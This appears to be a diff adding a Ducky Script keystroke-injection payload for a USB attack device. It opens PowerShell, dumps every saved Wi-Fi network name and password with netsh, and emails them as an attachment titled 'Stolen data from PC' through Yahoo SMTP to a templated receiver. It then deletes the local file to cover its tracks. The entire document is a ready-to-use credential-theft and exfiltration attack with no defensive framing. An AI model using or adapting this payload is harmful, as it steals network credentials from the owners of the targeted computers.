@@ -1,0 +1,37 @@
+WINDOWS d
+WINDOWS r
+DELAY 500
+REM Open cmd first
+STRING cmd
+ENTER
+DELAY 1000
+STRING cd "%USERPROFILE%\Desktop"
+ENTER
+STRING powershell
+ENTER
+STRING $Profiles=@()
+ENTER
+STRING $Profiles +=(netsh wlan show profiles) | Select-String "\:(.+)$" | Foreach{$_.Matches.Groups[1].Value.Trim()}
+ENTER
+STRING $res = $Profiles | Foreach{$SSID = $_ ; (netsh wlan show profile name="$_" key=clear)} |
+ENTER
+STRING Select-String "Key Content\W+\:(.+)$" |
+ENTER
+STRING Foreach{$pass=$_.Matches.Groups[1].Value.Trim(); $_} |
+ENTER
+STRING Foreach{[PSCustomObject]@{Wireless_Network_Name=$SSID;Password=$pass}}
+ENTER
+STRING Format-Table -AutoSize
+ENTER
+STRING Out-File -FilePath .\wifi_pass.txt -InputObject $res -Encoding ASCII -Width 50
+ENTER
+STRING Send-MailMessage -To '{{receiver_email}} -from '{{sender_email}}' -Subject "Stolen data from PC" -Body "Exploited data is stored in the attachment." -Attachments .\wifi_pass.txt -SmtpServer 'smtp.mail.yahoo.com' -Credential $(New-Object System.Management.Automation.PSCredential -ArgumentList '{{sender_email}}', $('{{password}}' | ConvertTo-SecureString -AsPlainText -Force)) -UseSsl -Port 587
+ENTER
+DELAY 500
+STRING Remove-Item .\wifi_pass.txt
+ENTER
+STRING exit
+ENTER
+DELAY 500
+STRING exit
+ENTER
